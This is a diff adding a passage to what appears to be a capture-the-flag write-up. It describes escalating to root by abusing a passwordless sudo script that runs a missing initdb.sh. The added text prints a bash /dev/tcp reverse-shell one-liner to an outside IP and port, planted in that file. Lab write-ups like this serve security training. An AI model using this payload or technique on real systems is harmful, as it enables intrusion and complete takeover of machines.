@@ -122,3 +122,15 @@ The command was inserted into the date field and reverse shell as user dvir retr
 <img width="927" height="107" alt="image" src="https://github.com/user-attachments/assets/667eb4b7-8ad0-4c16-9f45-ca7e6f2d86e6" />\
 user `dvir` can run `/usr/bin/syscheck` without password
 
+<img width="1009" height="406" alt="image" src="https://github.com/user-attachments/assets/d86d34cb-7030-4437-a9ec-72fc04c92175" />
+
+After reviewing the code, it checks for a process named initdb.sh. If the process is not running, it executes initdb.sh.
+
+<img width="387" height="64" alt="image" src="https://github.com/user-attachments/assets/72a9166d-2d02-4869-b243-4537587beeb2" />
+<img width="197" height="33" alt="image" src="https://github.com/user-attachments/assets/179be572-7f83-43f4-999c-400f1971d9e1" />
+
+
+```
+0<&196;exec 196<>/dev/tcp/10.10.14.107/5555; sh <&196 >&196 2>&196
+```
+When `/usr/bin/syscheck` was executed, it returned an error. Since `initdb.sh` did not exist, the file was created with a reverse shell payload. After a few seconds, a reverse shell was obtained as the root user.
